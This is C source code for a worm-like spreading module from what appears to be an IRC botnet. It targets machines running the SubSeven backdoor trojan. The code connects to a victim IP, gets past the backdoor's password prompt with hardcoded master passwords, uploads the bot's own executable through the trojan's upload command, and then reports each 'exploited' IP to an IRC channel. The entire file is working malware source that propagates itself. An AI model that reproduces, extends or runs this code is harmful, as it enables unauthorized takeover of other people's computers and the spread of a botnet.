#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SUB7

int Sub7_Receive(SOCKET ssock)
{
	TIMEVAL timeout;
    timeout.tv_sec = 30;//timeout after 30 sec.
    timeout.tv_usec = 0;

   	fd_set fd_struct;
   	FD_ZERO(&fd_struct);
    FD_SET(ssock, &fd_struct);

	if (fselect(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
		fclosesocket(ssock); 
		return -1;
	}

	return 0;
}

BOOL Sub7(EXINFO exinfo)
{
	char buffer[IRCLINE];

	int repeat=0, c;
	DWORD mode=0;

	SOCKET ssock;
	if ((ssock = fsocket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET) 
		return FALSE;

	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = finet_addr(exinfo.ip);
	sin.sin_port = fhtons((unsigned short)exinfo.port);

	fconnect(ssock,(LPSOCKADDR)&sin,sizeof(sin));
	fioctlsocket(ssock,FIONBIO,&mode);

	restart:;

	memset(buffer,0,sizeof(buffer));
	if (Sub7_Receive(ssock) == -1) 
		goto end;
	if (frecv(ssock, buffer, sizeof(buffer), 0) <= 0) 
		goto end;
      	      
	if (strcmp(buffer,"PWD") == 0) {
		if (repeat > 1)
			goto end;
		else
			sprintf(buffer,((repeat == 0)?("PWD715"):("PWD14438136782715101980")));
		repeat++;

		if (fsend(ssock,buffer,strlen(buffer), 0) <= 0) 
			goto end;
		goto restart;
	}

	strtok(buffer," ");
	if (strcmp(buffer,"connected.") == 0) {
		fsend(ssock,"UPS",3, 0);

		memset(buffer,0,sizeof(buffer));
		if (Sub7_Receive(ssock) == -1) 
			goto end;
		frecv(ssock, buffer, sizeof(buffer), 0);
		if (strcmp(buffer,"TID") != 0) 
			goto end;

		char botfile[MAX_PATH], tmpbuf[1041];
		GetModuleFileName(NULL,botfile,sizeof(botfile));
		HANDLE testfile = CreateFile(botfile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) 
			goto end;
		int size = GetFileSize(testfile,NULL);
		CloseHandle(testfile);

		sprintf(buffer,"SFT05%i",size);
		fsend(ssock,buffer,10, 0);

		FILE *infile;
		if ((infile = fopen(botfile,"rb")) == NULL) 
			goto end;
		while (1) {
			memset(tmpbuf,0,sizeof(tmpbuf));
			c = fread(tmpbuf,1,sizeof(tmpbuf),infile);
			if (c == 0) 
				break;
			if (fsend(ssock,tmpbuf ,c, 0) <= 0) {
				fclose(infile);
				goto end;
			}
		}
		fclose(infile);
		c=0;
		DWORD err = frecv(ssock, buffer, sizeof(buffer), 0);
		while (err > 0) {
			if ((c > 3) || (Sub7_Receive(ssock) == -1)) 
				break;
			err = frecv(ssock, buffer, sizeof(buffer), 0);
			c++;
		}
		fclosesocket(ssock);

		_snprintf(buffer,sizeof(buffer),"[%s]: Exploiting IP: %s.",exploit[exinfo.exploit].name,exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;

		return TRUE;

	} else if (repeat == 1) {
		fclosesocket(ssock);
		Sleep(2000);
		if ((ssock = CreateSock(exinfo.ip,exinfo.port)) == SOCKET_ERROR) 
			goto end;
		goto restart;
	}

	end:;

	fclosesocket(ssock);

	return FALSE;
}
#endif
